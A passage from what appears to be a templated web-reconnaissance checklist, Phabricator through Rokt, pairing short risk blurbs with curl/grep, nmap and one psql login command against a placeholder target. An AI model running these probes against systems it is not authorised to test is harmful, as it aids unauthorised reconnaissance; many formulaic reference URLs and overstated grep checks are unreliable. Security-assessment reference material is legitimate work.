<!-- id: phabricator-1 | severity: medium | tags: phabricator, code-review, devtools, meta -->
Phabricator instances expose project repositories, diff history, and internal development workflows.

**Commands:**
```bash
curl -s http://target.com/diffusion/
curl -s http://target.com/maniphest/
```

**References:**
- https://secure.phabricator.com/book/phabricator/article/security/

---

## Phaser
<!-- id: phaser | icon: 🛠️ | color: #e06c75 -->
Security checklists for Phaser game framework.

### Check Phaser for version exposure
<!-- id: phaser-1 | severity: low | tags: phaser, game, javascript, framework -->
Phaser version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "phaser\|phaser\.min"
```

**References:**
- https://phaser.io/security

---

## Phoenix
<!-- id: phoenix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Phoenix web framework.

### Check Phoenix for exposed live view
<!-- id: phoenix-1 | severity: medium | tags: phoenix, elixir, framework, websocket -->
Phoenix LiveView WebSocket connections may leak internal channel state and session information.

**Commands:**
```bash
curl -sI http://target.com | grep -i "phoenix\|x-phoenix"
```

**References:**
- https://www.phoenixframework.org/security

---

## PHP
<!-- id: php | icon: 🛠️ | color: #e06c75 -->
Security checklists for PHP scripting language.

### Check PHP for version disclosure
<!-- id: php-1 | severity: high | tags: php, scripting, server, x-powered-by -->
PHP version headers reveal outdated versions vulnerable to known CVEs including RCE and DoS attacks.

**Commands:**
```bash
curl -sI http://target.com | grep -i "php\|x-powered-by"
curl -s http://target.com/index.php?=
```

**References:**
- https://www.php.net/security/

---

## Pinia
<!-- id: pinia | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pinia Vue state management.

### Check Pinia for exposed store data
<!-- id: pinia-1 | severity: medium | tags: pinia, vue, state-management, frontend -->
Pinia store hydration in SSR may leak sensitive state data through `__INITIAL_STATE__` or `window.__pinia`.

**Commands:**
```bash
curl -s http://target.com | grep -i "__pinia\|__INITIAL_STATE__"
```

**References:**
- https://pinia.vuejs.org/

---

## Pinterest
<!-- id: pinterest | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pinterest social platform.

### Check Pinterest for exposed tag data
<!-- id: pinterest-1 | severity: low | tags: pinterest, social, tracking, widget -->
Pinterest conversion tags and embed widgets may leak user interaction data to external parties.

**Commands:**
```bash
curl -s http://target.com | grep -i "pinterest"
```

**References:**
- https://www.pinterest.com/security/

---

## Pipedrive
<!-- id: pipedrive | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pipedrive CRM platform.

### Check Pipedrive for exposed API tokens
<!-- id: pipedrive-1 | severity: high | tags: pipedrive, crm, sales, api -->
Pipedrive API tokens in client-side code or network requests grant unauthorized access to CRM data.

**Commands:**
```bash
curl -s http://target.com | grep -i "pipedrive"
```

**References:**
- https://www.pipedrive.com/security

---

## Plaid
<!-- id: plaid | icon: 🛠️ | color: #e06c75 -->
Security checklists for Plaid fintech API platform.

### Check Plaid for exposed public key
<!-- id: plaid-1 | severity: high | tags: plaid, fintech, banking, api-key -->
Plaid public key and environment in client-side Link library may reveal the Plaid environment and institution access.

**Commands:**
```bash
curl -s http://target.com | grep -i "plaid\|PLAID"
```

**References:**
- https://plaid.com/security/

---

## Plasmic
<!-- id: plasmic | icon: 🛠️ | color: #e06c75 -->
Security checklists for Plasmic visual builder platform.

### Check Plasmic for exposed API tokens
<!-- id: plasmic-1 | severity: medium | tags: plasmic, cms, visual-builder, api -->
Plasmic API tokens exposed in client-side code allow unauthorized modification of site content and components.

**Commands:**
```bash
curl -s http://target.com | grep -i "plasmic"
```

**References:**
- https://www.plasmic.app/security

---

## Platform.sh
<!-- id: platformsh | icon: 🛠️ | color: #e06c75 -->
Security checklists for Platform.sh hosting platform.

### Check Platform.sh for environment exposure
<!-- id: platformsh-1 | severity: medium | tags: platformsh, hosting, cloud, paas -->
Platform.sh environment URLs reveal development, staging, and production instances for targeted attacks.

**Commands:**
```bash
curl -s http://target.com | grep -i "platform\.sh"
```

**References:**
- https://platform.sh/security/

---

## Plausible
<!-- id: plausible | icon: 🛠️ | color: #e06c75 -->
Security checklists for Plausible web analytics platform.

### Check Plausible for exposed shared links
<!-- id: plausible-1 | severity: low | tags: plausible, analytics, privacy, tracking -->
Plausible shared links may expose site analytics data including visitor counts and page views.

**Commands:**
```bash
curl -s http://target.com | grep -i "plausible"
```

**References:**
- https://plausible.io/security

---

## Plivo
<!-- id: plivo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Plivo cloud communications platform.

### Check Plivo for exposed auth tokens
<!-- id: plivo-1 | severity: high | tags: plivo, sms, voice, api, communications -->
Plivo authentication tokens exposed in source code allow unauthorized SMS and voice API access.

**Commands:**
```bash
curl -s http://target.com | grep -i "plivo"
```

**References:**
- https://www.plivo.com/security/

---

## Plone
<!-- id: plone | icon: 🛠️ | color: #e06c75 -->
Security checklists for Plone CMS.

### Check Plone for exposed admin panel
<!-- id: plone-1 | severity: high | tags: plone, cms, python, admin -->
Plone admin panel exposed allows brute-force attacks and enumeration of user accounts.

**Commands:**
```bash
curl -s http://target.com/plone/
curl -s http://target.com/manage
```

**References:**
- https://plone.org/security/

---

## Plotly
<!-- id: plotly | icon: 🛠️ | color: #e06c75 -->
Security checklists for Plotly data visualization library.

### Check Plotly for exposed data traces
<!-- id: plotly-1 | severity: medium | tags: plotly, visualization, javascript, data -->
Plotly chart data in client-side JavaScript may leak sensitive business data and internal metrics.

**Commands:**
```bash
curl -s http://target.com | grep -i "plotly"
```

**References:**
- https://plotly.com/security/

---

## Pocket
<!-- id: pocket | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pocket bookmarking service.

### Check Pocket for exposed consumer key
<!-- id: pocket-1 | severity: medium | tags: pocket, bookmarking, api, social -->
Pocket consumer key in client-side code allows third parties to access user's saved articles and tags.

**Commands:**
```bash
curl -s http://target.com | grep -i "pocket\|getpocket"
```

**References:**
- https://getpocket.com/security/

---

## Podia
<!-- id: podia | icon: 🛠️ | color: #e06c75 -->
Security checklists for Podia digital products platform.

### Check Podia for exposed store data
<!-- id: podia-1 | severity: medium | tags: podia, ecommerce, digital, storefront -->
Podia storefront page structure may leak product listings, pricing, and subscriber data.

**Commands:**
```bash
curl -s http://target.com | grep -i "podia"
```

**References:**
- https://www.podia.com/security/

---

## Polyfill
<!-- id: polyfill | icon: 🛠️ | color: #e06c75 -->
Security checklists for Polyfill service.

### Check Polyfill for supply chain risk
<!-- id: polyfill-1 | severity: high | tags: polyfill, cdn, javascript, supply-chain -->
Polyfill CDN services may introduce malicious code through compromised polyfill bundles affecting legacy browser users.

**Commands:**
```bash
curl -s http://target.com | grep -i "polyfill\|polyfill\.io"
```

**References:**
- https://polyfill.io/security/

---

## Polylang
<!-- id: polylang | icon: 🛠️ | color: #e06c75 -->
Security checklists for Polylang WordPress plugin.

### Check Polylang for exposed language data
<!-- id: polylang-1 | severity: low | tags: polylang, wordpress, multilingual, plugin -->
Polylang language cookie and URL parameters may leak available language locales and site structure.

**Commands:**
```bash
curl -s http://target.com | grep -i "polylang\|pll_"
```

**References:**
- https://polylang.pro/security/

---

## Polymer
<!-- id: polymer | icon: 🛠️ | color: #e06c75 -->
Security checklists for Polymer web components library.

### Check Polymer for version exposure
<!-- id: polymer-1 | severity: low | tags: polymer, webcomponents, javascript, frontend -->
Polymer version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "polymer\|webcomponents"
```

**References:**
- https://polymer-library.polymer-project.org/

---

## PostHog
<!-- id: posthog | icon: 🛠️ | color: #e06c75 -->
Security checklists for PostHog product analytics platform.

### Check PostHog for exposed API key
<!-- id: posthog-1 | severity: high | tags: posthog, analytics, product, self-hosted -->
PostHog API key in client-side JavaScript allows unauthorized access to product analytics and user session recordings.

**Commands:**
```bash
curl -s http://target.com | grep -i "posthog"
```

**References:**
- https://posthog.com/security

---

## PostgreSQL
<!-- id: postgresql | icon: 🛠️ | color: #e06c75 -->
Security checklists for PostgreSQL database.

### Check PostgreSQL for exposed port
<!-- id: postgresql-1 | severity: high | tags: postgresql, database, sql, server -->
PostgreSQL port 5432 exposed to the internet allows brute-force attacks and database enumeration.

**Commands:**
```bash
nmap -p 5432 target.com
psql -h target.com -p 5432 -U postgres
```

**References:**
- https://www.postgresql.org/security/

---

## Postman API Documentation
<!-- id: postman-api | icon: 🛠️ | color: #e06c75 -->
Security checklists for Postman API documentation.

### Check Postman for exposed API collections
<!-- id: postman-api-1 | severity: high | tags: postman, api, documentation, collection -->
Postman public API documentation may leak API endpoints, authentication tokens, and request/response examples.

**Commands:**
```bash
curl -s http://target.com | grep -i "postman\|documenter\.getpostman"
```

**References:**
- https://www.postman.com/security/

---

## PouchDB
<!-- id: pouchdb | icon: 🛠️ | color: #e06c75 -->
Security checklists for PouchDB client-side database.

### Check PouchDB for exposed local data
<!-- id: pouchdb-1 | severity: medium | tags: pouchdb, database, offline, indexeddb -->
PouchDB stores data client-side in IndexedDB, allowing XSS to extract sensitive local data and sync credentials.

**Commands:**
```bash
curl -s http://target.com | grep -i "pouchdb\|PouchDB"
```

**References:**
- https://pouchdb.com/security/

---

## Preact
<!-- id: preact | icon: 🛠️ | color: #e06c75 -->
Security checklists for Preact JavaScript framework.

### Check Preact for version exposure
<!-- id: preact-1 | severity: low | tags: preact, react, javascript, framework -->
Preact version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "preact"
```

**References:**
- https://preactjs.com/security/

---

## Prebid
<!-- id: prebid | icon: 🛠️ | color: #e06c75 -->
Security checklists for Prebid header bidding platform.

### Check Prebid for exposed configuration
<!-- id: prebid-1 | severity: medium | tags: prebid, ads, header-bidding, monetization -->
Prebid configuration in page source reveals ad partners, bidder parameters, and price floors.

**Commands:**
```bash
curl -s http://target.com | grep -i "prebid\|pbjs\."
```

**References:**
- https://prebid.org/security/

---

## Prismic
<!-- id: prismic | icon: 🛠️ | color: #e06c75 -->
Security checklists for Prismic headless CMS.

### Check Prismic for exposed repository URL
<!-- id: prismic-1 | severity: medium | tags: prismic, cms, headless, api -->
Prismic repository URL in client-side code reveals the CMS backend endpoint for content API enumeration.

**Commands:**
```bash
curl -s http://target.com | grep -i "prismic"
```

**References:**
- https://prismic.io/security/

---

## Privy
<!-- id: privy | icon: 🛠️ | color: #e06c75 -->
Security checklists for Privy popup builder platform.

### Check Privy for exposed site ID
<!-- id: privy-1 | severity: low | tags: privy, popup, marketing, email -->
Privy site ID in JavaScript allows identification of the marketing account and popup configurations.

**Commands:**
```bash
curl -s http://target.com | grep -i "privy"
```

**References:**
- https://www.privy.com/security/

---

## ProcessWire
<!-- id: processwire | icon: 🛠️ | color: #e06c75 -->
Security checklists for ProcessWire CMS.

### Check ProcessWire for exposed admin panel
<!-- id: processwire-1 | severity: high | tags: processwire, cms, php, admin -->
ProcessWire admin panel (`/processwire/`) exposed allows brute-force attacks on admin credentials.

**Commands:**
```bash
curl -s http://target.com/processwire/
```

**References:**
- https://processwire.com/security/

---

## Proxmox VE
<!-- id: proxmox | icon: 🛠️ | color: #e06c75 -->
Security checklists for Proxmox VE virtualization platform.

### Check Proxmox VE for exposed admin panel
<!-- id: proxmox-1 | severity: high | tags: proxmox, virtualization, hypervisor, admin -->
Proxmox VE web interface exposed allows brute-force and exploitation of known CVEs.

**Commands:**
```bash
curl -s http://target.com:8006/
```

**References:**
- https://www.proxmox.com/security/

---

## PubNub
<!-- id: pubnub | icon: 🛠️ | color: #e06c75 -->
Security checklists for PubNub real-time messaging platform.

### Check PubNub for exposed publish/subscribe keys
<!-- id: pubnub-1 | severity: high | tags: pubnub, realtime, messaging, websocket -->
PubNub publish/subscribe keys in client-side code allow unauthorized access to real-time communication channels.

**Commands:**
```bash
curl -s http://target.com | grep -i "pubnub"
```

**References:**
- https://www.pubnub.com/security/

---

## Pure CSS
<!-- id: pure-css | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pure CSS framework.

### Check Pure CSS for version exposure
<!-- id: pure-css-1 | severity: low | tags: purecss, css, framework, frontend -->
Pure CSS version identifiers in stylesheets may reveal outdated versions with potential vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "pure\.css\|pure-min\."
```

**References:**
- https://purecss.io/security/

---

## Pusher
<!-- id: pusher | icon: 🛠️ | color: #e06c75 -->
Security checklists for Pusher real-time WebSocket platform.

### Check Pusher for exposed app key
<!-- id: pusher-1 | severity: medium | tags: pusher, websocket, realtime, app-key -->
Pusher app key in client-side code allows unauthorized subscription to public and presence channels.

**Commands:**
```bash
curl -s http://target.com | grep -i "pusher"
```

**References:**
- https://pusher.com/security/

---

## PyroCMS
<!-- id: pyrocms | icon: 🛠️ | color: #e06c75 -->
Security checklists for PyroCMS.

### Check PyroCMS for exposed admin panel
<!-- id: pyrocms-1 | severity: high | tags: pyrocms, cms, php, admin -->
PyroCMS admin panel exposed allows brute-force attacks on admin credentials.

**Commands:**
```bash
curl -s http://target.com/admin/
```

**References:**
- https://pyrocms.com/security/

---

## Python
<!-- id: python | icon: 🛠️ | color: #e06c75 -->
Security checklists for Python programming language.

### Check Python for server-side header disclosure
<!-- id: python-1 | severity: medium | tags: python, server, scripting, wsgi -->
Python server headers (`Python/`, `WSGIServer/`) reveal the Python version for targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "python\|wsgi"
```

**References:**
- https://www.python.org/security/

---

## PythonAnywhere
<!-- id: pythonanywhere | icon: 🛠️ | color: #e06c75 -->
Security checklists for PythonAnywhere hosting platform.

### Check PythonAnywhere for subdomain exposure
<!-- id: pythonanywhere-1 | severity: low | tags: pythonanywhere, hosting, python, paas -->
PythonAnywhere subdomains reveal the hosting account username and application structure.

**Commands:**
```bash
curl -s http://target.com | grep -i "pythonanywhere"
```

**References:**
- https://www.pythonanywhere.com/security/

---

## Qualtrics
<!-- id: qualtrics | icon: 🛠️ | color: #e06c75 -->
Security checklists for Qualtrics survey platform.

### Check Qualtrics for exposed survey data
<!-- id: qualtrics-1 | severity: medium | tags: qualtrics, survey, research, data -->
Qualtrics survey iframes and JavaScript may leak survey response data and project identifiers.

**Commands:**
```bash
curl -s http://target.com | grep -i "qualtrics\|qualtrics\.com"
```

**References:**
- https://www.qualtrics.com/security/

---

## Quasar
<!-- id: quasar | icon: 🛠️ | color: #e06c75 -->
Security checklists for Quasar Vue framework.

### Check Quasar for version exposure
<!-- id: quasar-1 | severity: low | tags: quasar, vue, framework, frontend -->
Quasar version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "quasar"
```

**References:**
- https://quasar.dev/security/

---

## Qwik
<!-- id: qwik | icon: 🛠️ | color: #e06c75 -->
Security checklists for Qwik web framework.

### Check Qwik for exposed prefetch data
<!-- id: qwik-1 | severity: medium | tags: qwik, framework, javascript, ssr -->
Qwik prefetch data in HTML may leak server-side computations and component state.

**Commands:**
```bash
curl -s http://target.com | grep -i "qwik"
```

**References:**
- https://qwik.dev/security/

---

## Radix UI
<!-- id: radix-ui | icon: 🛠️ | color: #e06c75 -->
Security checklists for Radix UI component library.

### Check Radix UI for version exposure
<!-- id: radix-ui-1 | severity: low | tags: radixui, react, ui, components -->
Radix UI version identifiers may reveal outdated versions with known accessibility and rendering issues.

**Commands:**
```bash
curl -s http://target.com | grep -i "radix\|@radix-ui"
```

**References:**
- https://www.radix-ui.com/security

---

## Railway
<!-- id: railway | icon: 🛠️ | color: #e06c75 -->
Security checklists for Railway cloud hosting platform.

### Check Railway for environment exposure
<!-- id: railway-1 | severity: medium | tags: railway, hosting, cloud, paas -->
Railway project URLs may reveal environment names and deployment configurations.

**Commands:**
```bash
curl -s http://target.com | grep -i "railway\|railway\.app"
```

**References:**
- https://railway.app/security

---

## RainLoop
<!-- id: rainloop | icon: 🛠️ | color: #e06c75 -->
Security checklists for RainLoop webmail client.

### Check RainLoop for exposed admin panel
<!-- id: rainloop-1 | severity: high | tags: rainloop, webmail, email, client -->
RainLoop admin panel exposed allows brute-force attacks and email account enumeration.

**Commands:**
```bash
curl -s http://target.com/?admin
```

**References:**
- https://www.rainloop.net/security/

---

## Rakuten
<!-- id: rakuten | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rakuten ecommerce platform.

### Check Rakuten for exposed affiliate data
<!-- id: rakuten-1 | severity: medium | tags: rakuten, ecommerce, affiliate, advertising -->
Rakuten affiliate links and tracking IDs may reveal commission structures and partner relationships.

**Commands:**
```bash
curl -s http://target.com | grep -i "rakuten"
```

**References:**
- https://www.rakuten.com/security/

---

## RankMath SEO
<!-- id: rankmath | icon: 🛠️ | color: #e06c75 -->
Security checklists for RankMath SEO WordPress plugin.

### Check RankMath for exposed API keys
<!-- id: rankmath-1 | severity: medium | tags: rankmath, seo, wordpress, plugin -->
RankMath API keys and analytics tokens in page source may expose search analytics data.

**Commands:**
```bash
curl -s http://target.com | grep -i "rankmath"
```

**References:**
- https://rankmath.com/security/

---

## Raphael
<!-- id: raphael | icon: 🛠️ | color: #e06c75 -->
Security checklists for Raphael vector graphics library.

### Check Raphael for version exposure
<!-- id: raphael-1 | severity: low | tags: raphael, svg, javascript, graphics -->
Raphael version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "raphael\|raphael\.min"
```

**References:**
- https://dmitrybaranovskiy.github.io/raphael/

---

## Razorpay
<!-- id: razorpay | icon: 🛠️ | color: #e06c75 -->
Security checklists for Razorpay payment platform.

### Check Razorpay for exposed API key
<!-- id: razorpay-1 | severity: high | tags: razorpay, payments, india, api-key -->
Razorpay API key in client-side code allows unauthorized payment processing and refund initiation.

**Commands:**
```bash
curl -s http://target.com | grep -i "razorpay\|rzp_id"
```

**References:**
- https://razorpay.com/security/

---

## React
<!-- id: react | icon: 🛠️ | color: #e06c75 -->
Security checklists for React JavaScript framework.

### Check React for development mode exposure
<!-- id: react-1 | severity: medium | tags: react, javascript, framework, frontend -->
React development mode in production reveals component trees, props, and potential XSS vectors.

**Commands:**
```bash
curl -s http://target.com | grep -i "react\.js\|react\.development\|__REACT_DEVTOOLS"
```

**References:**
- https://react.dev/security

---

## React Router
<!-- id: react-router | icon: 🛠️ | color: #e06c75 -->
Security checklists for React Router navigation library.

### Check React Router for exposed client-side routes
<!-- id: react-router-1 | severity: medium | tags: react-router, spa, routing, frontend -->
React Router client-side route definitions may leak internal application paths and protected resources.

**Commands:**
```bash
curl -s http://target.com | grep -i "react-router\|createBrowserRouter"
```

**References:**
- https://reactrouter.com/security

---

## Read the Docs
<!-- id: read-the-docs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Read the Docs documentation platform.

### Check Read the Docs for exposed internal docs
<!-- id: read-the-docs-1 | severity: medium | tags: readthedocs, documentation, sphinx, oss -->
Read the Docs hosted documentation may reveal API keys, internal endpoints, and version history.

**Commands:**
```bash
curl -s http://target.com | grep -i "readthedocs\|readthedocs\.io"
```

**References:**
- https://readthedocs.org/security/

---

## ReadSpeaker
<!-- id: readspeaker | icon: 🛠️ | color: #e06c75 -->
Security checklists for ReadSpeaker text-to-speech platform.

### Check ReadSpeaker for exposed customer ID
<!-- id: readspeaker-1 | severity: low | tags: readspeaker, tts, accessibility, voice -->
ReadSpeaker customer ID in script tags reveals the account identifier for the speech service.

**Commands:**
```bash
curl -s http://target.com | grep -i "readspeaker\|rspkr"
```

**References:**
- https://www.readspeaker.com/security/

---

## Recharge
<!-- id: recharge | icon: 🛠️ | color: #e06c75 -->
Security checklists for Recharge subscription platform.

### Check Recharge for exposed API key
<!-- id: recharge-1 | severity: high | tags: recharge, subscriptions, ecommerce, api -->
Recharge API key in client-side code allows unauthorized access to subscription data and customer information.

**Commands:**
```bash
curl -s http://target.com | grep -i "recharge"
```

**References:**
- https://recharge.com/security/

---

## Recharts
<!-- id: recharts | icon: 🛠️ | color: #e06c75 -->
Security checklists for Recharts data visualization library.

### Check Recharts for exposed chart data
<!-- id: recharts-1 | severity: low | tags: recharts, charts, visualization, react -->
Recharts chart data in client-side JavaScript may leak business metrics and sensitive data points.

**Commands:**
```bash
curl -s http://target.com | grep -i "recharts"
```

**References:**
- https://recharts.org/security

---

## Recurly
<!-- id: recurly | icon: 🛠️ | color: #e06c75 -->
Security checklists for Recurly subscription billing platform.

### Check Recurly for exposed public key
<!-- id: recurly-1 | severity: medium | tags: recurly, billing, subscriptions, payments -->
Recurly public key in client-side code reveals the billing account and subscription configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "recurly"
```

**References:**
- https://recurly.com/security/

---

## Red Hat
<!-- id: redhat | icon: 🛠️ | color: #e06c75 -->
Security checklists for Red Hat enterprise infrastructure.

### Check Red Hat for server header disclosure
<!-- id: redhat-1 | severity: medium | tags: redhat, linux, enterprise, server -->
Red Hat server headers reveal the operating system version for targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "red hat\|rhel"
```

**References:**
- https://www.redhat.com/security/

---

## Reddit
<!-- id: reddit | icon: 🛠️ | color: #e06c75 -->
Security checklists for Reddit social platform.

### Check Reddit for exposed embed data
<!-- id: reddit-1 | severity: low | tags: reddit, social, embed, widget -->
Reddit embed widgets and post embeds may leak subreddit activity and user interaction data.

**Commands:**
```bash
curl -s http://target.com | grep -i "reddit\|reddit\.com"
```

**References:**
- https://www.reddit.com/security/

---

## Redux
<!-- id: redux | icon: 🛠️ | color: #e06c75 -->
Security checklists for Redux state management library.

### Check Redux for exposed store state
<!-- id: redux-1 | severity: high | tags: redux, state-management, javascript, devtools -->
Redux DevTools enabled in production exposes the entire application state tree including auth tokens and user data.

**Commands:**
```bash
curl -s http://target.com | grep -i "redux\|__REDUX_DEVTOOLS_EXTENSION__"
```

**References:**
- https://redux.js.org/security

---

## RedwoodJS
<!-- id: redwoodjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for RedwoodJS full-stack framework.

### Check RedwoodJS for exposed GraphQL endpoint
<!-- id: redwoodjs-1 | severity: high | tags: redwoodjs, graphql, framework, jamstack -->
RedwoodJS built-in GraphQL endpoint may leak schema definitions and allow unauthorized queries.

**Commands:**
```bash
curl -s http://target.com/.redwood/functions/graphql
```

**References:**
- https://redwoodjs.com/security

---

## Refersion
<!-- id: refersion | icon: 🛠️ | color: #e06c75 -->
Security checklists for Refersion affiliate tracking platform.

### Check Refersion for exposed affiliate ID
<!-- id: refersion-1 | severity: low | tags: refersion, affiliate, tracking, marketing -->
Refersion affiliate ID in JavaScript reveals the affiliate account and tracking configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "refersion"
```

**References:**
- https://www.refersion.com/security/

---

## Releva
<!-- id: releva | icon: 🛠️ | color: #e06c75 -->
Security checklists for Releva marketing automation platform.

### Check Releva for exposed tracking code
<!-- id: releva-1 | severity: low | tags: releva, marketing, automation, tracking -->
Releva tracking script IDs may reveal the marketing account and automation workflow identifiers.

**Commands:**
```bash
curl -s http://target.com | grep -i "releva"
```

**References:**
- https://releva.com/security/

---

## Remix
<!-- id: remix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Remix React framework.

### Check Remix for exposed loader data
<!-- id: remix-1 | severity: high | tags: remix, react, framework, ssr -->
Remix loader functions may leak server-side data, API keys, and database credentials if not properly scoped.

**Commands:**
```bash
curl -s http://target.com | grep -i "remix\|__remixContext\|root\.loader"
```

**References:**
- https://remix.run/security

---

## Remotion
<!-- id: remotion | icon: 🛠️ | color: #e06c75 -->
Security checklists for Remotion programmatic video framework.

### Check Remotion for exposed API key
<!-- id: remotion-1 | severity: medium | tags: remotion, video, react, rendering -->
Remotion Lambda API keys in client bundles may allow unauthorized video rendering and AWS resource usage.

**Commands:**
```bash
curl -s http://target.com | grep -i "remotion\|remotion\.lambda"
```

**References:**
- https://remotion.dev/security

---

## Render
<!-- id: render | icon: 🛠️ | color: #e06c75 -->
Security checklists for Render cloud hosting platform.

### Check Render for exposed environment variables
<!-- id: render-1 | severity: medium | tags: render, hosting, cloud, paas -->
Render deployment URLs and service names may reveal environment configuration and internal service endpoints.

**Commands:**
```bash
curl -s http://target.com | grep -i "render\.com\|onrender\.com"
```

**References:**
- https://render.com/security

---

## Replit
<!-- id: replit | icon: 🛠️ | color: #e06c75 -->
Security checklists for Replit online IDE platform.

### Check Replit for exposed secrets
<!-- id: replit-1 | severity: high | tags: replit, ide, hosting, secrets -->
Replit Secrets and REPL_ID in source code may reveal API keys and authentication tokens.

**Commands:**
```bash
curl -s http://target.com | grep -i "replit\|replit\.id\|REPL_ID"
```

**References:**
- https://replit.com/security

---

## RequireJS
<!-- id: requirejs | icon: 🛠️ | color: #e06c75 -->
Security checklists for RequireJS module loader.

### Check RequireJS for exposed module paths
<!-- id: requirejs-1 | severity: low | tags: requirejs, javascript, modules, amd -->
RequireJS configuration reveals the entire application module structure and JavaScript file paths.

**Commands:**
```bash
curl -s http://target.com | grep -i "requirejs\|require\.config\|data-main"
```

**References:**
- https://requirejs.org/security

---

## Resend
<!-- id: resend | icon: 🛠️ | color: #e06c75 -->
Security checklists for Resend email API platform.

### Check Resend for exposed API key
<!-- id: resend-1 | severity: high | tags: resend, email, api, communications -->
Resend API key in client-side bundles allows unauthorized email sending and potential phishing abuse.

**Commands:**
```bash
curl -s http://target.com | grep -i "resend\|resend\.com"
```

**References:**
- https://resend.com/security

---

## Retool
<!-- id: retool | icon: 🛠️ | color: #e06c75 -->
Security checklists for Retool internal tool builder.

### Check Retool for exposed instance
<!-- id: retool-1 | severity: high | tags: retool, low-code, internal, dashboard -->
Retool instance exposed without authentication reveals internal dashboards, database queries, and business workflows.

**Commands:**
```bash
curl -s http://target.com | grep -i "retool"
```

**References:**
- https://retool.com/security

---

## Reveal.js
<!-- id: revealjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Reveal.js HTML presentation framework.

### Check Reveal.js for version exposure
<!-- id: revealjs-1 | severity: low | tags: revealjs, presentations, javascript, html -->
Reveal.js version identifiers in JS files may reveal outdated versions with known XSS vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "reveal\.js\|Reveal\|reveal\.min"
```

**References:**
- https://revealjs.com/security

---

## Resy
<!-- id: resy | icon: 🛠️ | color: #e06c75 -->
Security checklists for Resy restaurant reservation platform.

### Check Resy for embedded widget data
<!-- id: resy-1 | severity: low | tags: resy, restaurants, reservations, widget -->
Resy reservation widgets may leak restaurant booking data and API tokens in page source.

**Commands:**
```bash
curl -s http://target.com | grep -i "resy\|resy\.com"
```

**References:**
- https://resy.com/security

---

## Reviews.io
<!-- id: reviews-io | icon: 🛠️ | color: #e06c75 -->
Security checklists for Reviews.io review platform.

### Check Reviews.io for exposed widget ID
<!-- id: reviews-io-1 | severity: low | tags: reviewsio, reviews, widgets, ecommerce -->
Reviews.io widget ID in page source reveals the merchant account and review collection configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "reviews\.io\|widget\.reviews"
```

**References:**
- https://www.reviews.io/security

---

## Rickshaw
<!-- id: rickshaw | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rickshaw JavaScript chart library.

### Check Rickshaw for version exposure
<!-- id: rickshaw-1 | severity: low | tags: rickshaw, charts, javascript, visualization -->
Rickshaw version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "rickshaw\|rickshaw\.min"
```

**References:**
- https://shutterstock.github.io/rickshaw/

---

## Riot.js
<!-- id: riotjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Riot.js UI library.

### Check Riot.js for version exposure
<!-- id: riotjs-1 | severity: low | tags: riotjs, javascript, ui, framework -->
Riot.js version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "riot\.js\|riot\+\.min"
```

**References:**
- https://riot.js.org/security

---

## Ripple
<!-- id: ripple | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ripple payment protocol.

### Check Ripple for exposed API endpoint
<!-- id: ripple-1 | severity: medium | tags: ripple, payments, blockchain, crypto -->
Ripple API endpoints may leak transaction data, wallet balances, and payment history.

**Commands:**
```bash
curl -s http://target.com | grep -i "ripple\|xrp\|ripple\.com"
```

**References:**
- https://ripple.com/security

---

## Rise.ai
<!-- id: rise-ai | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rise.ai loyalty and gift card platform.

### Check Rise.ai for exposed API key
<!-- id: rise-ai-1 | severity: medium | tags: riseai, loyalty, gift-cards, ecommerce -->
Rise.ai API keys in client-side code may allow unauthorized gift card creation and loyalty point manipulation.

**Commands:**
```bash
curl -s http://target.com | grep -i "rise\.ai\|riseai"
```

**References:**
- https://rise.ai/security

---

## Riskified
<!-- id: riskified | icon: 🛠️ | color: #e06c75 -->
Security checklists for Riskified fraud prevention platform.

### Check Riskified for exposed merchant ID
<!-- id: riskified-1 | severity: low | tags: riskified, fraud, payments, ecommerce -->
Riskified merchant ID in page source reveals the fraud prevention account and configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "riskified"
```

**References:**
- https://riskified.com/security

---

## Rive
<!-- id: rive | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rive interactive animation platform.

### Check Rive for exposed animation data
<!-- id: rive-1 | severity: low | tags: rive, animation, interactive, design -->
Rive animation files loaded from third-party CDNs may leak application interaction design and state machine logic.

**Commands:**
```bash
curl -s http://target.com | grep -i "rive\.app\|rive\.wasm\|\.riv"
```

**References:**
- https://rive.app/security

---

## Roistat
<!-- id: roistat | icon: 🛠️ | color: #e06c75 -->
Security checklists for Roistat analytics platform.

### Check Roistat for exposed tracking ID
<!-- id: roistat-1 | severity: low | tags: roistat, analytics, tracking, marketing -->
Roistat tracking ID in page source reveals the analytics account and visitor tracking configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "roistat"
```

**References:**
- https://roistat.com/security

---

## Rokt
